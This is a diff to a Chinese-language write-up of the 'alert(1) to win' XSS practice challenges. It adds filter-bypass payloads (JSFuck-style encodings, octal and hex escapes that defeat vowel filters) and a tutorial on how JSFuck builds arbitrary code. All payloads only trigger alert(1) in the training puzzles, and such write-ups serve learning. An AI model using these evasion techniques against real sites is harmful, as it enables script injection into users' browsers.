@@ -240,7 +240,7 @@ function escape(s) {
 ```
 
 与 `Callback` 题目类似的，不同之处在于在本题中过滤了反斜杠。这就导致了 `Callback`的答案中的注释 `//` 是无法使用的。但是鉴于最后的JavaScript的代码会嵌入了html代码中，因此可以考虑使用html的注释方法来完成本题。
-
+javascript 的注释是有三种的，分别为 `//`  `/**/`  `<!--`。
 
 payload:
 `'#';alert(1)<!--`
@@ -271,6 +271,40 @@ jsfuck 以这种风格写成的代码中仅使用 `[` 、 `]`、 `(`、 `)`、 `
 
 ```
 ");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
+```
+
+or 自己筛选字符。
+
+```
+_=!1+URL+!0
+```
+在chrome浏览器下，返回的字符串为
+```
+falsefunction URL() { [native code] }true
+```
+
+那么变量 `_` 即为 字符串 `falsefunction URL() { [native code] }true` 。
+
+```
+fill           =>    _[0]+_[10]+_[2]+_[2]
+constructor    =>    _[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]
+alert          =>    _[1]+_[2]+_[4]+_[38]+_[9]
+```
+
+只需要在JS中执行  `[]["fill"]["constructor"]("alert(1)")()` 即可。
+
+其对应的JSfuck代码为：
+```
+_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()
+```
+最终的结果为
+```
+");_=!1+URL+!0,[][_[0]+_[10]+_[2]+_[2]][_[8]+_[11]+_[7]+_[3]+_[9]+_[38]+_[39]+_[8]+_[9]+_[11]+_[38]](_[1]+_[2]+_[4]+_[38]+_[9]+'(1)')()//
+```
+
+还可以转换成8进制，这样不含有像十六进制字符 `x` 。
+```
+");[]['\160\157\160']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()//
 ```
 
 ## iframe
@@ -394,13 +428,209 @@ payload:
 ```
 <!--<script>#)/;alert(1)//-->
 ```
+## K'Z'K
+```
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels in honor of K'Z'K the Destroyer
+    s = s.replace(/[aeiouy]/gi, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+
+此题替换所有的`aeiouy`，可以使用匿名函数，将其中的替换成十六进制或者8进制即可。
+
+```
+[]["pop"]["constructor"]('alert(1)')()
+```
+十进制
+```
+>>> (ord('o'))
+111
+>>> (ord('u'))
+117
+>>> (ord('a'))
+97
+>>> (ord('e'))
+101
+```
+
+十六进制
+```
+hex(ord('o')) 	'0x6f'
+hex(ord('u')) '0x75'
+hex(ord('a')) '0x61'
+hex(ord('e')) '0x65'
+
+```
+即
+```
+[]["p\x6fp"]["c\x6fnstr\x75ct\x6fr"]('\x61l\x65rt(1)')()
+```
+八进制：
+```
+oct(ord('o')) '0157'
+oct(ord('u')) '0165'
+oct(ord('a')) '0141'
+oct(ord('e')) '0145'
+```
+即
+```
+[]["p\157p"]["c\157nstr\165ct\157r"]('\141l\145rt(1)')()
+```
+最终的payload为：
+```
+");[]["p\157p"]["c\157nstr\165ct\157r"]('\141l\145rt(1)')();//
+```
 
 
+## K'Z'K
+```
+// submitted by Stephen Leppik
+function escape(s) {
+    // remove vowels and escape sequences in honor of K'Z'K 
+    // y is only sometimes a vowel, so it's only removed as a literal
+    s = s.replace(/[aeiouy]|\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi, '')
+    // remove certain characters that can be used to get vowels
+    s = s.replace(/[{}!=<>]/g, '');
+    return '<script>console.log("' + s + '");</script>';
+}
+```
+貌似这道题把这几个字母的字符，十进制，十六进制，八进制都给过滤掉了，还过滤了其他字符。
+但是由于替换掉的字符为空，我们可以利用多字符拼接，把目标字符保留下来。
+
+```
+");[]["p\1\15757p"]["c\157nstr\165ct\157r"]('\141l\145rt(1)')();//
+```
+payload:
+```
+");[]["p\1\15757p"]["c\1\15757nstr\1\16565ct\1\15757r"]('\1\14141l\1\14545rt(1)')();//
+```
 # 问题总结
 
 什么时候加 【;】
 
 
+# 知识补给
+
+## JS
+
+学习 `[` , `]` , `(` , `)` , `!` 和 `+` 的其他用法，首先需要记住以下几点：
+
+- 用 `!` 开头会转换成 `Boolean 布尔值`
+- 用 `+` 开头会转换成 `Number 数值类型`
+- 添加 `[]` 会转换成 `String 字符串`
+- `![] === false` 、 `+[] === 0` 、 `[]+[] === ""`
+
+另外可以通过 `[]` 获取字符串中特定的字符
+ `"hello"[0] === "h" `
+
+也可以把数字串起来后再转换回数值：
+`+("1" + "1") === 11 `
+
+好了, 来看看用这六个字符怎么可以得到一个字母a:
+```
+![] === false
+![] + [] === "false"
+// ---------------
+!![] === true
++!![] === 1
+// ---------------
+(![] + [])[+!![]] === 'a'
+```
+用这个技巧我们可以轻易把 `true` 和 `false` 中所有字母都取出来: `a,e,f,l,r,s,t,u`。
+
+还有什么其他可用的吗？ `undefined !`
+
+undefined 我们可以通过 `[][[]]` 得出来。
+` [][[]] + [] === "undefined" `
+这样我们可以额外得到d,i和n
+```
+([][[]] + [])[+!![]] === 'n'
+([][[]] + [])[+!![]+!![]] === 'd'
+```
+
+利用目前我们得到的这些字母，我们可以拼出 `fill`, `filter` 和 `find`。 当然还可以拼出其他单词，但这三个单词都是数组的方法！
+
+还有一件事我们需要知道的是，对象的属性我们都可以通过 `[]` 获取到。 `[2,1]["fill"]()` 和 `[2,1].fill()` 是一样的！
+
+`[]["fill"]` 返回 `function fill() { [native code] }` , 利用添加 `[]` 会转换成 `String` 的规则我们得到:
+```
+[]["fill"]+[] === "function fill() { [native code] }"
+```
+这样一来我们又获得了: `c,o,v,(,),{,[,],}`。
+
+进而我们可以得到 `constructor` 。
+
+利用 `constructor` 函数可以返回对象的构造方法:
+```
+true["constructor"] + [] === "function Boolean() { [native code] }"
+0["constructor"] + []    === "function Number() { [native code] }"
+""["constructor"] + []   === "function String() { [native code] }"
+[]["constructor"] + []   === "function Array() { [native code] }"
+```
+`B,N,S,A,m,g,y` 又收入囊中.
+
+现在我们可以得到 `toString` 了:
+
+`(10)["toString"] () === "10"`
+嗯，虽然我们现在可以把任何东西都转换成字符串了，但是有个什么鸟用呢？
+
+你有所不知的是，toString 有一个神秘的raidx 参数，可以指定用于数字到字符串的转换的基数。
+```
+(12)["toString"](10) === "12" // base 10 - normal to us
+(12)["toString"](2) === "1100" // base 2, or binary, for 12
+(12)["toString"](8) === "14" // base 8 (octonary) for 12
+(12)["toString"](16) === "c" // hex for 12
+```
+利用这个方法，我们可以得到所有字符了. 0-9, a-z:
+```
+(10)["toString"](36) === "a"
+(35)["toString"](36) === "z"
+```
+利用一些过期的现在已不推荐使用的[HTML wrapper methods](https://developer.mozilla.org/en-US/docs/tag/HTML%20wrapper%20methods)，我们可以得到另外一些标点符号:
+```
+"test""bold" === "<b>test</b>"
+```
+上面得到了<,>和/.
+
+现在我们还差大写字母.
+
+或许你听说过escape函数。 `escape()`函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。escape函数是我们成败的至关重要的一环！
+
+现在我们可以拼写出escape但是我们怎么样可以执行呢, escape可是属于全局对象的！
+
+问题来了，任何函数的构造函数是什么呢？
+
+答案是：`function Function() { [native code] }`, Function 对象本身。
+```
+[]["fill"]["constructor"] === Function
+```
+利用Function对象，我们可以把字符串作为参数然后去创建一个函数:
+```
+Function("alert('test')")
+```
+我们只需要在最后添加()就可以执行 alert 了，所以我们可以这样使用escape函数:
+```
+[]["fill"]["constructor"]("return escape(' ')")() === "%20"
+```
+如果我们把 `<` 穿入escape会返回 `%3C`。 C对于我们得到剩下的字母非常重要:
+```
+[]["fill"]["constructor"]("return escape('<')")()[2] === "C"
+```
+用了C, 我们就可以用 `fromCharCode` 函数了 `!fromCharCode()` 可接受一个指定的 Unicode 值，然后返回一个字符串。 `fromCharCode` 是 `String` 对象的方法，因此可以这样调用:
+```
+""["constructor"]["fromCharCode"](65) === "A"
+""["constructor"]["fromCharCode"](46) === "."
+```
+至此为止，利用[Unicode对照表](http://unicodelookup.com)我们可以得到任何字符了！
+这就是JSFUCK的原理。更具体地参见[这里](https://github.com/aemkei/jsfuck#basics)，嘿嘿。
+
+
+
+我的答题：
+
+<https://alf.nu/alert(1)#accesstoken=hu1CraLkoNlT87K1BlhV>
 
 
 # 参考
@@ -409,3 +639,7 @@ payload:
 [escape.alf.nu XSS Challenges 8-15 之进阶的XSS](https://blog.csdn.net/u012763794/article/details/51526725)
 [XSS练习平台【a/lert(1) to win】](https://blog.csdn.net/taozijun/article/details/81004359)
 [alert(1) to win payloads](https://github.com/masazumi-github/alert-1-to-win#a020)
+[6个字符搞定一切](https://xinranliu.me/2016-10-14-six-characters-in-js/)
+[escape.alf.nu XSS Challenges Write-ups (Part 2)](https://rstforums.com/forum/topic/74310-escapealfnu-xss-challenges-write-ups-part-2/)
+[escape-Write-ups (Part 2) ](https://github.com/evilddog/hexo_blog_backup/blob/master/source/_posts/escape-alf-nu-write-ups-2.md)
+[Ye Olde Crockford JSON regexp is Bypassable](https://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html)
